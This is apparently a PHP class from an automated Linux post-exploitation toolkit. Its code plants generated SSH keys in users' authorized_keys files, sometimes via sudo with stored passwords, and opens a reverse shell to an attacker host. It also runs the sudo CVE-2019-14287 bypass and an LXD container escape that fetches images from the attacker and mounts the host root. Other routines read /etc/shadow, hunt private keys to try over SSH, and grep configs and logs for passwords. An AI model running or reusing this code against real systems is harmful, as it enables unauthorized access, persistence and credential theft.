<?php

class check4linux8misc extends check4linux8enum{
    var $tab_authorized_keys_hosts ;
    var $tab_private_keys ;


    
    /*
     * 
  https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh
 
     * 
     */
    public function __construct($eth,$domain,$ip,$port,$protocol) {
        parent::__construct($eth,$domain,$ip,$port,$protocol);

    }
    
    
    
    public function key2gen4priv2pem($stream,$timeout,$private_key_file,$private_key_passwd){
        if (!empty($private_key_passwd)) $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -outform pem -text -out $private_key_file.pem",$this->stream_timeout,"");
        else $this->req_str($stream,"openssl rsa -in $private_key_file -outform pem -text -out $private_key_file.pem",$this->stream_timeout,"");
        
        $this->req_str($stream,"ls -al $private_key_file.pem",$this->stream_timeout,"");
        $this->req_str($stream,"file $private_key_file.pem",$this->stream_timeout,"");
        $this->req_str($stream,"head -5 $private_key_file.pem",$this->stream_timeout,"");
        return "$private_key_file.pem";
    }
    
    
    public function key2gen4priv($stream,$timeout,$private_key_file,$private_key_passwd){
        $this->ssTitre ( "Gen Private key " );
        $query = "openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out $private_key_file" ;
        if(!file_exists($private_key_file)) $this->requette($query);
        else $this->cmd("localhost", $query);
        
        $query = "openssl rsa -check -in $private_key_file";
        $this->req_str($stream,$query,$this->stream_timeout,"");
        $query = "openssl rsa -in $private_key_file -text -noout";
        //$this->req_str($stream,$query,$timeout,"");
        $this->req_str($stream,"ls -al $private_key_file",$this->stream_timeout,"");
        $this->req_str($stream,"file $private_key_file",$this->stream_timeout,"");
        $this->key2gen4priv2pem($stream,$this->stream_timeout,$private_key_file,$private_key_passwd);
        return trim($this->req_str($stream,"head -5 $private_key_file",$this->stream_timeout,"" ));
    }
    
    
    
    public function key2gen4public($stream,$timeout,$private_key_file, $public_key_file, $private_key_passwd){
        $this->ssTitre ( "Gen Public key" );
        $public_key_str = "";
        if (empty($private_key_file)) {
            $this->log2error("Empty Private key");
            return $public_key_str;
        }
        var_dump($private_key_passwd);
        if(!file_exists($public_key_file)) {
            
            if (!empty($private_key_passwd)) $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -pubout -out $public_key_file.tmp",$this->stream_timeout,"");
            else $this->req_str($stream,"openssl rsa -in $private_key_file -pubout -out $public_key_file.tmp",$timeout ,"");
            $this->req_str($stream,"head -5 $public_key_file.tmp",$timeout,"" );
            $this->req_str($stream,"ssh-keygen -i -m PKCS8 -f $public_key_file.tmp > $public_key_file ",$timeout,"");
            
        }
        
        $this->req_str($stream,"ssh-keygen -l -f $public_key_file ",$timeout,"");
        $this->req_str($stream,"ls -al $public_key_file",$timeout,"");
        $this->req_str($stream,"file $public_key_file",$timeout,"");
        return trim($this->req_str($stream,"head -5 $public_key_file",$timeout,""));
        
    }
    
    
    public function keys4check($stream,$remote_username,$password2use,$authorized_keys_filepath,$key2search):bool{
        $this->ssTitre(__FUNCTION__);
        
        $query = "cat $authorized_keys_filepath";
        $authorized_keys_str = trim($this->req_str($stream,$query,$this->stream_timeout,""));
        $this->pause();
        
        
        if(stristr($authorized_keys_str,$key2search)!==FALSE) {
            $this->log2succes("FOUND Public key - already exist");
            return TRUE ;
        }
        else {
            $chaine = "Try to Add Public key\n";
            $this->note($chaine);
            if (!empty($password2use)) $data = "echo '$this->$password2use' | sudo -S -u $remote_username /bin/bash -c \"echo '#".$this->user2agent."' | tee -a $authorized_keys_filepath \" ";
            else $data = "echo '#".$this->user2agent."' | tee -a $authorized_keys_filepath ";
            
            $this->req_str($stream,$data,$this->stream_timeout,"");
            
            if (!empty($password2use)) $data = "echo '$this->$password2use' | sudo -S -u $remote_username /bin/bash -c \"echo '$key2search' | tee -a $authorized_keys_filepath \"";
            else $data = "echo '$key2search' | tee -a $authorized_keys_filepath ";
            
            $this->req_str($stream,$data,$this->stream_timeout,"");
            $this->pause();
            $query = "cat $authorized_keys_filepath";
            $authorized_keys_str = trim($this->req_str($stream,$query,$this->stream_timeout,""));
            $this->pause();
            if(stristr($authorized_keys_str,$key2search)!==FALSE) {
                $this->log2succes("Succes ADD Keys");
                return TRUE ;
            }
            else {
                $this->log2error("Failed to ADD Keys");
                return FALSE ;
            }
        }
        
    }
    
    
    
    public function service4authorized_keys($stream,$authorized_keys_filepath,$authorized_keys_str,$remote_username,$remote_userpass,$local_username,$local_home_user){
        $this->ssTitre(__FUNCTION__);
        $result = "";
        $timeout = 10 ;
        $remote_username = trim($remote_username);
        
        $this->article("Remote Home User", $local_home_user);
        $this->article("Remote User2use", $remote_username);
        $private_key_ssh_rsa_file = "$this->dir_tmp/$this->ip.$remote_username.rsa.priv";
        $obj_file = new FILE($private_key_ssh_rsa_file);
        $public_key_ssh_rsa_file = "$obj_file->file_dir/$obj_file->file_name.pub";
        $pass_phrase = '';
        $private_keys_str = $this->key2gen4priv("",10,$private_key_ssh_rsa_file, $pass_phrase);
        $public_keys_str = $this->key2gen4public("",10,$private_key_ssh_rsa_file, $public_key_ssh_rsa_file,$pass_phrase);
        
        $query = "find $local_home_user -name authorized_keys -type f -maxdepth 3 -exec ls -al {} \; 2> /dev/null | awk '{print $9}' | grep \"authorized_keys\" $this->filter_file_path "; // | grep '$find_user'
        $authorized_keys_filepath = $this->req_str($stream,$query,$this->stream_timeout,$this->filter_file_path);
        
        
        if (empty($authorized_keys_filepath)){
            
            $this->req_str($stream,"cd $local_home_user; whoami",$this->stream_timeout,"");
            $query = "cd $local_home_user; ls -al";
            $this->req_str($stream,$query,$this->stream_timeout,"");
            $this->req_str($stream," whoami",$this->stream_timeout,"");
            $this->req_str($stream,"cd $local_home_user; mkdir ./.ssh",$this->stream_timeout,"");
            $query = "cd $local_home_user; chmod 777 -R $local_home_user/.ssh";
            $this->req_str($stream,$query,$this->stream_timeout,"");
            $query = "cd $local_home_user; echo '$public_keys_str' > $local_home_user/.ssh/authorized_keys";
            $this->req_str($stream,$query,$this->stream_timeout,"");
            $query = "cd $local_home_user; ls -al $local_home_user/.ssh";
            $this->req_str($stream,$query,$this->stream_timeout,"");
            
            
            $query = "chown $local_username  $local_home_user/.ssh/authorized_keys";
            //$this->req_str($stream,$query,$this->stream_timeout,"");
            
            
            $query = "find $local_home_user -name authorized_keys -type f -maxdepth 3 -exec ls -al {} \; 2> /dev/null | awk '{print $9}' | grep \"authorized_keys\" $this->filter_file_path "; // | grep '$find_user'
            $authorized_keys_filepath = $this->req_str($stream,$query,$this->stream_timeout,$this->filter_file_path);
            
        }
        
        if (!empty($authorized_keys_filepath)){
            
            if ($remote_username === "root" ) $password2use = $this->root_passwd;
            else $password2use = $this->created_user_pass ;
            
            if ($this->keys4check($stream,$remote_username, $password2use,$authorized_keys_filepath, $public_keys_str)!==FALSE){
                
                $ssh_ports = $this->ip2ports4service("ssh");
                foreach ($ssh_ports as $ssh_open)
                    if(!empty($ssh_open)) {
                        
                        $stream = $this->stream8ssh2key8priv4file($this->ip, $ssh_open, $local_username, $private_key_ssh_rsa_file,"");
                        if(is_resource($stream)){
                            $info = "SSH Private Key:$private_key_ssh_rsa_file";
                            $this->log2succes($info);
                            $template_shell = "ssh -i $private_key_ssh_rsa_file -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $local_username@$this->ip -p $ssh_open -C  '%SHELL%'";
                            $templateB64_shell = base64_encode($template_shell);
                            $attacker_ip = $this->ip4addr4target($this->ip);
                            $attacker_port = rand(1024,65535);
                            $shell = "/bin/bash";
                            $cmd_rev  = $this->rev8fifo($attacker_ip, $attacker_port, $shell);
                            $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
                            $lport = $ssh_open;
                            $lprotocol = 'T' ;
                            $type = "server";
                            $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
                        }
                        
                    }
                
            }
            
        }
        return $result;
    }
    
    
    public function stream4key8priv4str($stream,$host,$port,$login,$private_key_str,$private_key_file){
        $this->ssTitre(__FUNCTION__);
        $this->str2file($private_key_str, $private_key_file);
        $obj_file = new FILE($private_key_file);
        $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
        if (!file_exists($public_key_file)) {
            $this->key2gen4priv("",10,$private_key_file, $public_key_file);
        }
        return $this->stream4key8public($stream,$host,$port,$login,$public_key_file,$private_key_file, "");
        
    }
    public function stream8ssh2key8priv4str($host,$port,$login,$private_key_str,$private_key_file,$private_key_passwd){
        $this->ssTitre(__FUNCTION__);
        $this->str2file($private_key_str, $private_key_file);
        $obj_file = new FILE($private_key_file);
        $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
        if (!file_exists($public_key_file)) {
            $this->key2gen4priv("",10,$private_key_file, $private_key_passwd);
            $this->key2gen4public("",10, $private_key_file, $public_key_file,$private_key_passwd);
        }
        return $this->stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file, $private_key_passwd);
    }
    
    public function stream8ssh2key8priv4file($host,$port,$login,$private_key_file,$private_key_passwd){
        /*
         https://medium.com/tsscyber/multiple-security-vulnerabilities-in-dell-emc-avamar-e114c16425d0
         */
        $this->ssTitre(__FUNCTION__);
        
        $obj_file = new FILE($private_key_file);
        $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
        
        
        if (!file_exists($public_key_file)) {
            $this->key2gen4priv("",10,$private_key_file, $public_key_file);
        }
        return $this->stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file, $private_key_passwd);
    }
    
    
    public function stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file,$private_key_passwd){
        $this->ssTitre(__FUNCTION__);
        $login = trim($login);
        
        $query = "file $private_key_file";
        $check_pem = trim($this->req_ret_str($query));
        if (strstr($check_pem, "PEM RSA private key")!==FALSE){
            $this->log2succes("Convert PEM for libssh - PHP");
            $private_key_file = $this->key2gen4priv2pem("", 10, $private_key_file,$private_key_passwd);
        }
        $query = "head -5 $private_key_file";
        $priv_keys = trim($this->req_ret_str($query));
        if (empty($priv_keys)) return $this->log2error("Empty Private Key");
        $query = "head -5 $public_key_file";
        $pub_keys = trim($this->req_ret_str($query));
        if (empty($pub_keys)) return $this->log2error("Empty Public Key");
        $cmd = "id";
        $this->requette("chmod 600 $private_key_file");
        $this->requette("head -5 $private_key_file");
        $query = "ssh -i $private_key_file $login@$this->ip -p $port -o ConnectTimeout=15 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  -C id";
        $this->cmd("localhost",$query);
        
        
        $con = @ssh2_connect( $host, $port,array('hostkey'=>'ssh-rsa') );
        if($con===FALSE) {
            $chaine = "Failed Connection";
            $this->log2error($chaine);
            return FALSE ;
        }
        $infos = "Public Key:$public_key_file\nPrivate Key:$private_key_file\nPass Key: $private_key_passwd";
        $this->note($infos);
        
        
        $this->requette("ls -al $public_key_file");
        $this->requette("file $public_key_file");
        $this->requette("head -5 $public_key_file");
        
        $this->requette("ls -al $private_key_file");
        $this->requette("file $private_key_file");
        $this->requette("head -5 $private_key_file");
        if (@ssh2_auth_pubkey_file($con,$login,$public_key_file,"$private_key_file.pem",$private_key_passwd)!==FALSE) {
            
            $this->yesAUTH($this->port2id, $login, "", "", "", "", "", "", $infos, $this->ip2geoip());
            $this->log2succes("Identification réussie en utilisant une clé publique");
            $this->port2shell(base64_encode($infos));
            $this->pause();
            return $con ;
        } else {
            $chaine = "Failed Public Key Authentication";
            $this->log2error($chaine);
            return FALSE ;
        }
        
        // $stream = ssh2_shell($con, 'vt102', null, 80, 24, SSH2_TERM_UNIT_CHARS);
        // $stream_out = ssh2_fetch_stream($stream, SSH2_STREAM_STDIO);
        
    }
    
    
    
    public function misc2writable_files($stream){
        $this->ssTitre(__FUNCTION__);
        // https://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/
    }
    
    public function misc2readable_files($stream){
        $this->ssTitre(__FUNCTION__);
        
    }
    
    public function misc2exec_files($stream){
        $this->ssTitre(__FUNCTION__);
    }
    
    public function misc2sudo8CVE_2019_14287($stream){
        $this->ssTitre(__FUNCTION__);
        $template_id_euid = "sudo -u#-1 %ID% -u ";
        if (!$this->ip2root8db($this->ip2id))  $this->pentest8id($stream,$template_id_euid);
        $template_id_euid = "sudo -u#4294967295 %ID% -u ";
        if (!$this->ip2root8db($this->ip2id))  $this->pentest8id($stream,$template_id_euid);
    }
    
    public function misc2sudo($stream){
        $this->ssTitre("can we sudo without supplying a password");
        $template_id_euid = "sudo -l -k %ID% 2>/dev/null";
        $this->pentest8id($stream,$template_id_euid);
    }
    
    public function misc2container($stream){
        $this->titre(__FUNCTION__);
        $this->misc2container2lxd($stream);
        $this->misc2container2docker($stream);
    }
    
    
    public function misc2container2docker($stream){
        $this->ssTitre(__FUNCTION__);
        // https://www.hackingarticles.in/docker-installation-configuration/
        
        $this->note("specific checks - check to see if we're in a docker container");
        
        $data = "docker ps";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "grep -i docker /proc/self/cgroup  2>/dev/null; find / -name \"*dockerenv*\" -exec ls -la {} \; 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("specific checks - check to see if we're a docker host");
        $data = "docker --version 2>/dev/null; docker ps -a 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("specific checks - are we a member of the docker group");
        $data = "id | grep -i docker 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("specific checks - are there any docker files present");
        $data = "find / -name Dockerfile -o -name docker-compose.yml -exec ls -l {} 2>/dev/null \;";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("specific checks - are we in an lxd/lxc container");
        $data = "grep -qa container=lxc /proc/1/environ 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("specific checks - are we a member of the lxd group");
        $data = "id | grep -i lxd 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
    }
    
    public function misc2container2lxd($stream){
        $this->ssTitre(__FUNCTION__);
        /*
         wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-root.tar.xz
wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-lxd.tar.xz
lxc image import xenial-server-cloudimg-amd64-lxd.tar.xz rootfs xenial-server-cloudimg-amd64-root.tar.xz --alias SomeAlias
lxc launch SomeAlias MyMachine
         */
        $attacker_ip = $this->ip4addr4target($this->ip);

        

        
        $file_path = "$this->dir_tmp/xenial-server-cloudimg-amd64-root.tar.xz";
        $query = "cp -v $this->dir_tools/lan/linux/xenial-server-cloudimg-amd64-root.tar.xz $file_path";
        if (!file_exists($file_path)) $this->requette($query);
        $data = "wget http://$attacker_ip:$this->port_rfi/xenial-server-cloudimg-amd64-root.tar.xz ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $file_path = "$this->dir_tmp/xenial-server-cloudimg-amd64-lxd.tar.xz";
        $query = "cp -v $this->dir_tools/lan/linux/xenial-server-cloudimg-amd64-lxd.tar.xz $file_path";
        if (!file_exists($file_path)) $this->requette($query);
        $data = "wget http://$attacker_ip:$this->port_rfi/xenial-server-cloudimg-amd64-lxd.tar.xz ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
               
        $data = "lxc image import xenial-server-cloudimg-amd64-lxd.tar.xz rootfs xenial-server-cloudimg-amd64-root.tar.xz --alias SomeAlias";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "lxc list";
        $this->req_str($stream,$data,$this->stream_timeout,"");
                
        $data = "lxc init SomeAlias test -c security.privileged=true";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "lxc config device add test whatever disk source=/ path=/mnt/root recursive=true ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "lxc start test";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "lxc exec test bash ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $template_id_euid = "lxc exec test bash -c %ID%";
        $this->pentest8id($stream,$template_id_euid);
        
        
        
        $data = "lxc launch SomeAlias MyMachine";
        //$this->req_str($stream,$data,$this->stream_timeout,"");
        

    }
    
    
    
    public function misc($stream){
        $this->titre(__FUNCTION__);
        
        if (!$this->ip2root8db($this->ip2id))  $this->misc2keys($stream);$this->pause();
       return 0 ;
       if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_sudoers($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_exports($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_shadow($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->misc2sudo($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->misc2sudo8CVE_2019_14287($stream);$this->pause();       
       if (!$this->ip2root8db($this->ip2id))  $this->misc2writable_files($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->misc2readable_files($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->misc2container($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->misc2keys($stream);$this->pause();
       if (!$this->ip2root8db($this->ip2id))  $this->misc4passwd($stream);$this->pause();
    }
    
    

    
    
    
    public function misc2etc_shadow($stream){
        $this->ssTitre(__FUNCTION__);
        $filename = "/etc/shadow";
        $obj_filename = new FILE($filename);
        
        
        
        if ($this->file4readable($obj_filename->file_path)){
        
        $data = "grep -v -e '^$' /etc/passwd | grep ':'  | grep -v '^#' | sort -u 2>/dev/null";
        
        $lines_passwd = $this->req_str($stream,$data,$this->stream_timeout,"");
        $lines_passwd_str = $this->requette("echo \"$lines_passwd\"  | grep -v 'CMD:' ");
        $result .= $lines_passwd;
        
        $data = "grep -v -e '^$' /etc/shadow /etc/shadow~ | grep ':'  | grep -v '^#' | sort -u 2>/dev/null ";
        
        $lines_shadow = $this->req_str($stream,$data,$this->stream_timeout,"");
        $lines_shadow_str = $this->requette("echo \"$lines_shadow\"  | grep -v 'CMD:' ");
        $result .= $lines_shadow;
        
        
        if(!empty($lines_shadow_str)) {
            $this->root8shadow($lines_shadow_str, $lines_passwd_str);  
        }
        }

    }
     
    public function bin4syscall($stream,$lan_bin_path){
        $this->ssTitre(__FUNCTION__);
        $strace_bin_rst = array();
        $lan_bin_path = trim($lan_bin_path);
        $data = "strace -s 9999 -v -f $lan_bin_path 2>&1 | grep -i 'execve(' | grep \"execve(\\\"/bin/sh\\\", \\\[\\\"sh\\\", \\\"-c\\\"\\\,\" | grep -Po \"execve\\\(\\\"/bin/sh\\\", \\\[\\\"sh\\\", \\\"-c\\\"\\\, \\\"[a-z]{2,}\\\"\\\]\\\,\"";
        $strace_bin = trim($this->req_str($stream,$data,$this->stream_timeout*3,""));
        if (preg_match('#execve\(\"/bin/sh\", \[\"sh\", \"-c\", \"(?<syscall>[[:print:]]{2,})\"\],#',$strace_bin,$strace_bin_rst))
        {
            if (isset($strace_bin_rst['syscall'])){
                $this->article("SysCall",$strace_bin_rst['syscall']);
                return $strace_bin_rst['syscall'];
            }
        }
        else {
            $this->note("Not found execve into $lan_bin_path");
            return "";
        }
    }
   
    public function misc2user8pass8remote($stream,$username,$userpass,$ssh_port){
        $this->ssTitre(__FUNCTION__);
        $username = trim($username);
        $userpass = trim($userpass);
        $ssh_port = trim($ssh_port);
        
        $template_id_euid = "sshpass -p '$userpass' ssh $username@$this->ip -p $ssh_port -C \"%ID%\" ";
        $query = str_replace("%ID%","id", $template_id_euid);
        $this->requette($query);
        //$this->pentest8id($stream,$template_id_euid);
        //===============================================================
    }
    
    public function misc2user8pass8local($stream,$username,$userpass,$ssh_port){
        $this->ssTitre(__FUNCTION__);
        $username = trim($username);
        $userpass = trim($userpass);
        $ssh_port = trim($ssh_port);
        
        $template_id_euid = "echo -e \"ssh $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' <<#$userpass\n> /dev/tty\nls > /dev/tty\n#\" | bash ";
        $template_id_euid = "(echo '$userpass'; sleep 3; ) | ssh $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' ";
        $this->pentest8id($stream,$template_id_euid);
        //===============================================================
    }
    
     
    
    public function misc2user8key($stream,$username,$remote_privkey_path,$ssh_port){
        $this->ssTitre(__FUNCTION__);
        $username = trim($username);
        $remote_privkey_path = trim($remote_privkey_path);
        $ssh_port = trim($ssh_port);

        $template_id_euid = "ssh -i $remote_privkey_path  $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' ";

        $this->pentest8id($stream,$template_id_euid);
        //===============================================================
    }

 
    
    public function misc2keys2authorized_keys_file($stream,$authorized_keys_filepath){
        $this->ssTitre(__FUNCTION__);
        //===============================================================

            if (!empty($authorized_keys_filepath)){
                $query = "cat $authorized_keys_filepath";
                $authorized_keys_str = trim($this->req_ret_str($query));
                $local_username = "";
                $local_home_user = "";
                $ip2users = $this->ip2users4passwd();
                foreach ($ip2users as $remote_username => $remote_userpass)
                    $this->service4authorized_keys($stream, $authorized_keys_filepath, $authorized_keys_str, $remote_username, $remote_userpass, $local_username, $local_home_user);
            
        }
        //===============================================================
        
    }
    
    
    public function misc2keys4authorized_keys_file($stream,$path2search){
        $this->ssTitre(__FUNCTION__);
        //===============================================================
        $data = "find $path2search -name \"authorized_keys\" -exec cat {} 2>/dev/null \;";
        $filter = "";
        $this->req_str($stream,$data,$this->stream_timeout*3,$filter);
        
        $data = "find $path2search -iname \"authorized_keys\" -type f -exec ls -la {} \; 2>/dev/null ";
        $filter = " $this->filter_file_path | grep 'authorized_keys ";
        $authorized_keys_filepath = $this->req_str($stream,$data,$this->stream_timeout*3,$filter);
        $public_key_ssh_rsa_file_tab_remote = explode("\n",$authorized_keys_filepath);
        $this->pause();
        
        foreach ($public_key_ssh_rsa_file_tab_remote as $authorized_keys_filepath){
            $this->misc2keys2authorized_keys_file($stream,$authorized_keys_filepath);
        }
        //===============================================================
        
    }
    

    
    public function misc2keys4add($stream,$path2search){
        $this->ssTitre(__FUNCTION__);
        $tab_home = array();
        $this->note("home user");
        $data = "ls -dl $path2search/home/* 2>/dev/null ";
        $filter = "| awk '{print $9}' $this->filter_file_path ";
        $tab_home = $this->req_tab($stream,$data,$this->stream_timeout,$filter);
        var_dump($tab_home);
        $this->pause();
        $data = "ls -dl $path2search/root 2>/dev/null ";
        $filter = "| awk '{print $9}' $this->filter_file_path ";
        $tab_home[] = $this->req_str($stream,$data,$this->stream_timeout,$filter);
        $tab_home = array_reverse($tab_home);
        $this->article("All Home User", $this->tab($tab_home));
        //$tab_home = array("/home/nightfall");
        if (isset($tab_home[0])){
            foreach ($tab_home as $home_user){
                $home_user = trim($home_user);
                if (!empty($home_user)) $this->misc2keys2add($stream,$home_user);
            }
        }
        
    }
    
    public function misc2keys2add($stream,$home_user){
        $this->ssTitre(__FUNCTION__);
        $remote_username = "";
        $tmp = array();
        $this->article("home user",$home_user);
        $authorized_keys_filepath = "";
        $authorized_keys_str = "";
        $query = "echo '$home_user' $this->filter_file_path | sed \"s#/tmp/$this->ip.$this->port.nfs##g\"  | sed \"s#/home/##g\" | sed \"s#/##g\" | grep -Po \"[a-z0-9\_]{1,}\" ";
        exec($query,$tmp);
        $this->requette($query);
        if (isset($tmp[0])) $remote_username = trim($tmp[0]);
        
        $this->article("Remote Username", $remote_username);
        if (!empty($remote_username)) $this->service4authorized_keys($stream, $authorized_keys_filepath, $authorized_keys_str, $remote_username, "", $remote_username, $home_user);
        
        
    }
    
    public function misc2keys4info($stream){
        $this->ssTitre(__FUNCTION__);
        //===============================================================
        $data = "ls -alR ~/.ssh ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("Can private-key information be found?");
        $data = "ls /home/*\/.ssh/*";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "grep -v -e '^$' /etc/ssh/config ";
        $this->req_str($stream,$data,$this->stream_timeout,"");       
        
        $data = "grep -v -e '^$' /etc/ssh/ssh_config | grep -v \"^#\"";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "grep 'PubkeyAuthentication' /etc/ssh/ssh_config ";
        $this->req_str($stream,$data,$this->stream_timeout,"");

        $this->note("checks for if various ssh files are accessible");
        $data = "find / \( -name \"*_dsa\" -o -name \"*_rsa\" -o -name \"known_hosts\" -o -name \"authorized_hosts\" -o -name \"authorized_keys\" \) -exec ls -la {} 2>/dev/null \;";
        $this->req_str($stream,$data,$this->stream_timeout*3,"");
        
        $data = "grep \"PermitRootLogin\" /etc/ssh/sshd_config 2>/dev/null | grep -v \"#\" ";
        $check_root_acces = trim($this->req_str($stream,$data,$this->stream_timeout,""));
        if(stristr($check_root_acces,"PermitRootLogin yes")!==FALSE) $this->log2succes("Yes Root Access is Permited");
        if(stristr($check_root_acces,"PermitRootLogin no")!==FALSE) $this->note("Root Access is Not Permited");
    }

  
    
    public function misc2keys4users($stream,$path2search){
        $this->titre(__FUNCTION__);
        $tab_privkeys = array();
        $ssh_ports = $this->ip2ports4service("ssh");
        if (!empty($ssh_ports)){
            
        $data = "find $path2search \( -name \"id_dsa\" -o -name \"id_rsa\" -o -name \"ssh_host_key\" -o -name \"ssh_host_rsa_key\" -o -name \"ssh_host_dsa_key\" -o -name \"identity\"  \) -exec ls {} 2>/dev/null \;";
        $filter = "| grep -i -Po \"^(/[a-z0-9\-\_\.]{1,})*\" | sort -u ";
        $tab_privkeys = $this->req_tab($stream,$data,$this->stream_timeout*3,$filter);
        $this->pause();
        
        $this->article("All Priv Keys Location", $this->tab($tab_privkeys));
        $tab_users_shell = $this->ip2users4shell();
        if (empty($tab_users_shell)) $tab_users_shell = $this->ip2users();
        
        //$tab_users_shell = array("hbeale");
        //$tab_privkeys = array("/media/USB_1/Stuff/Keys/id_rsa");
        
        if (!empty($tab_privkeys)){
            foreach ($tab_privkeys as $remote_privkey_path){
                $remote_privkey_path = trim($remote_privkey_path);
                foreach ($tab_users_shell as $username){                    
                    foreach ($ssh_ports as $ssh_port){
                        if ( !empty($username) && !empty($ssh_port) ) $this->misc2user8key($stream,$username, $remote_privkey_path, $ssh_port);
            }
                }
            }
       
        }
        }
    }
    
    
    public function users2pass($stream,$user2name, $user2pass){
        $this->titre(__FUNCTION__);
        $ssh_ports = $this->ip2ports4service("ssh");
        foreach ($ssh_ports as $ssh_port){
            if (empty($ssh_port)) $ssh_port = "22" ;
            $this->misc2user8pass8local($stream,$user2name, $user2pass,$ssh_port);        
            $this->misc2user8pass8remote($stream,$user2name, $user2pass,$ssh_port);
            $this->users2user($stream,$user2name, $user2pass);
        }
    }
    
    
    public function users4pass($stream){
        $this->titre(__FUNCTION__);
        $ssh_ports = $this->ip2ports4service("ssh");
        
        
        foreach ($ssh_ports as $ssh_port){
            if (empty($ssh_port)) $ssh_port = "22" ;
        $users_passwd = $this->ip2users4passwd();
        foreach ($users_passwd as $user2name => $user2pass){
            if (!empty($user2name)) {
                if (!$this->ip2root8db($this->ip2id)) {
                    
                    
                    $this->misc2user8pass8local($stream,$user2name, $user2pass,$ssh_port);

                    $this->misc2user8pass8remote($stream,$user2name, $user2pass,$ssh_port);
                }
            }
        }
    }
    }
    
    
    public function misc2keys($stream,$path2search){
        $this->titre(__FUNCTION__);
        $path2search = "/";
        $this->misc2keys4users($stream,$path2search);$this->pause(); // OK 
        $this->misc2keys4info($stream,$path2search);$this->pause();        
        $this->misc2keys4authorized_keys_file($stream,$path2search);$this->pause();
        
    }
    
    
    
    public function misc4passwd($stream){
        
        $this->titre(__FUNCTION__);
        $this->note("Grep hardcoded passwords");
        $this->note("Is there anything in the log file(s)");
        $data = "grep -i pass /var/log/*log 2>/dev/null";
        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
        $result .= $lines;
        $this->pause();
        
        $data = "find / -type f -iname  \"*.php\" -exec grep -i -E \"(passwd|password|user|root|pass)\"   {} \; | grep -v \"#\"   2>/dev/null ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $this->note("Any of the service(s) settings misconfigured ? Are any (vulnerable) plugins attached?");
        $data = "find / -type f -iname  \"*.config\" -exec grep -i -E \"(passwd|password|user|root)\"  {} \;  | grep -v \"#\"  | grep -v \"^;\" 2>/dev/null ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $data = "find / -type f -iname  \"*.conf\" -exec grep -i -E \"(passwd|password|user)\"   {}  \;  | grep -v \"#\"  | grep -v \"^;\" 2>/dev/null ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $data = "find / -type f -iname  \"*.cfg\" -exec grep -i -E \"(passwd|password|user|root)\"   {} \;  | grep -v \"#\"  | grep -v \"^;\" 2>/dev/null ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("password policy information as stored in /etc/login.defs");
        $data = "grep \"^PASS_MAX_DAYS|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD\" /etc/login.defs 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $data = "ps -eo args --user 0 --no-headers ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        
        $data = "cat ~/.profile  | grep -v '^#' | sort -u 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "cat /var/mail/root";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "cat /var/spool/mail/root";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "btmp";
